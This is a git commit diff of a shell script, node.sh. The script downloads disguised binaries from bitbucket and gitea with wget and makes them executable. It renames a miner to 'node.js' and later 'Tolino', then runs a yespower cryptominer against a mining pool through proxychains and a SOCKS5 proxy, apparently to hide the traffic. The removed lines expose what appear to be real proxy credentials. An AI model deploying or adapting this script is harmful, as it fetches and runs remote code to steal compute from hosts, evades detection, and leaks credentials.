e8ddf29290efb99a7916ef8c56db126383462ff5
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-12 00:16:41 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,8 +1,6 @@
-proxy="us-east-static-01.quotaguard.com" 
-port="9293" 
-user="5f9d165gvj71eu"  
-pass="ninp27owlsys28ars0ni74zaamvvf2" 
-wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
+proxy="192.252.209.155" 
+port="14455" 
+wget -q -O Tolino https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Tolino
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +17,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./node.js -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Cucao) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://5f9d165gvj71eu:ninp27owlsys28ars0ni74zaamvvf2@us-east-static-01.quotaguard.com:1080 
+./panel ./Tolino -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-Tolino) --timeout 120 -p c=SWAMP,mc=VHH -x -x socks5://192.252.209.155:14455 
